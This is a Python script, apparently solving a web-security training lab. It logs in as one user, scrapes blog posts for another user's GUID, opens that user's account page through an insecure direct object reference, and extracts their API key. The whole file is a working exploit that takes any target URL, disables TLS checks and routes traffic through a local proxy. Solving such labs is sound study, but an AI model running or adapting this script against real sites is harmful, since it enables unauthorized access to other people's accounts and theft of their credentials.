import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def carlos_guid(s, url):
    r = requests.get(url, verify=False, proxies=proxies)
    res = r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    unique_postids = list(set(post_ids))
   

    #Find carlos post
    for i in unique_postids:
        r = s.get(url + "/post?postId=" + i, verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("[+] Found Carlos GUID!")
            guid = re.findall(r"userId=(.*)'", res)[0]
            return guid


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_api_key(s, url):
    #Get CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as user
    print("[+] Logging in as  a user...")
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        print("[+] Successfully logged in as a user!")

        # Obtain carlos GUID
        guid = carlos_guid(s, url)

        #Obtain carlos API Key
        carlos_account_url = url + "/my-account?id=" + guid
        r = s.get(carlos_account_url, verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("[+] Successfully accessed carlos account!")
            print("[+] Retrieving API key...")
            api_key = re.findall(r'Your API Key is:(.*)\<\/div>', res)
            print("[+] API Key is: " + api_key[0])
        else:
            print("[-] Could not access carlos account.")
        

    else:
        print("[-] Unable to login as a user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("Logging in as user...")
    carlos_api_key(s, url)

if __name__ == "__main__":
    main() 